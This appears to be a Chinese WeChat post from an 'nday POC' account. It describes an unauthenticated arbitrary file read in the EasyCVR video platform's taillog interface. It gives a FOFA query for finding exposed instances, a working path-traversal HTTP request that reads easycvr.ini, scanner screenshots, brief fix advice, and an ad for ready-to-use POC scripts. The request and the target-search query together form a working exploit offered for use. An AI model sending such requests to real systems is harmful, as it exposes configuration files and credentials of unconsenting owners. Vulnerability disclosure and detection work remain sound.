#  EasyCVR-视频管理平台 taillog 任意文件读取漏洞   
Superhero  nday POC   2024-12-27 07:54  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkYN4sZibCVo6EFo0N9b7Kib4I4N6j6Y10tynLOdgov9ibUmaNwW5yeoCbQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCkhic5lbbPcpxTLtLccZ04WhwDotW7g2b3zBgZeS5uvFH4dxf0tj0Rutw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Melo944GVOJECe5vg2C5YWgpyo1D5bCk524CiapZejYicic1Hf8LPt8qR893A3IP38J3NMmskDZjyqNkShewpibEfA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
内容仅用于学习交流自查使用，由于传播、利用本公众号所提供的  
POC  
信息及  
POC对应脚本  
而造成的任何直接或者间接的后果及损失，均由使用者本人负责，公众号nday poc及作者不为此承担任何责任，一旦造成后果请自行承担！如文章有侵权烦请及时告知，我们会立即删除文章并致歉。谢谢！  
  
  
**00******  
  
**产品简介**  
  
  
EasyCVR视频管理平台，作为TSINGSEE青犀视频旗下的一款重要产品，是一款功能强大的视频融合+A!智能分析网关平台。平台基于分布式、负载均衡等流媒体技术，提供广泛兼容、安全可靠、开放共享的视频综合服务。它支持多协议的设备视频接入、采集、AI智能检测、处理、分发、管理等服务，并具备轻量化接入、传输、处理与分发能力，可实现一站式视频融合共享管理。支持RTSP、RTMP、GB28181、GB35114、海康Ehome、大华SDK、海康SDK等多种协议的视频设备接入，兼容市面上几乎所有视频终端。  
**01******  
  
**漏洞概述**  
  
  
EasyCVR-视频管理平台 taillog 接口存在任意文件读取漏洞，未经身份验证攻击者可通过该漏洞读取系统重要文件（如数据库配置文件、系统配置文件）、数据库配置文件等等，导致网站处于极度不安全状态。  
**02******  
  
**搜索引擎**  
  
  
FOFA:  
```
title="EasyCVR"
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLBNPj1DgaM6FPaYF1ksQtEZwxMT9bP4eKD7RxUdgc65PYRpeBWNq1RFd0cDvorvdG1ScOVPAvKCA/640?wx_fmt=png&from=appmsg "")  
  
  
**03******  
  
**漏洞复现**  
```
GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLBNPj1DgaM6FPaYF1ksQtEwOibxtLyTltS39wDoDkiab0qQ57DnxJ3sdVDiaR4iaxJHbRDRBChMSNlcA/640?wx_fmt=png&from=appmsg "")  
  
  
**04**  
  
**检测工具**  
  
  
nuclei  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLBNPj1DgaM6FPaYF1ksQtEMscEnb8Hyds0Y7OqibxzdZB0Z0HFucnbNUBUw7O07K3sCKcarBLziamA/640?wx_fmt=png&from=appmsg "")  
  
afrog  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLBNPj1DgaM6FPaYF1ksQtE9Lu98bxA99enov2Giablz3QMJHGhGUNLeGib58LLwvwTV7m0DGR9ibE8Q/640?wx_fmt=png&from=appmsg "")  
  
xray  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwLBNPj1DgaM6FPaYF1ksQtEQnooicOWflPatiaXTViavpgbd1S4lsGCic9FLiakW5egYEChmsuKEPsfvlA/640?wx_fmt=png&from=appmsg "")  
  
  
**05******  
  
**修复建议**  
  
  
1、关闭互联网暴露面或接口设置访问权限  
  
2、打对应补丁或者升级至安全版本  
  
  
**06******  
  
**内部圈子介绍**  
  
  
1、本圈子主要是分享网上公布的1day/nday POC详情及对应检测脚本，目前POC脚本均支持xray、afrog、nuclei等三款常用工具。  
  
2、三款工具都支持内置poc+自写poc目录一起扫描。  
  
3、保持每周更新10-15个poc。  
  
4、所发布的POC脚本均已测试完毕，直接拿来即用。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/wnJTy44dqwI0X77l5WtnpfTexA6RwHXSbf1x3ZyT3bhcbWzRoFLyAgHkSMk9yGaZK5FDGcSCQp9ibPcicxHXIOcg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&retryload=2&tp=webp "")  
  
  
  
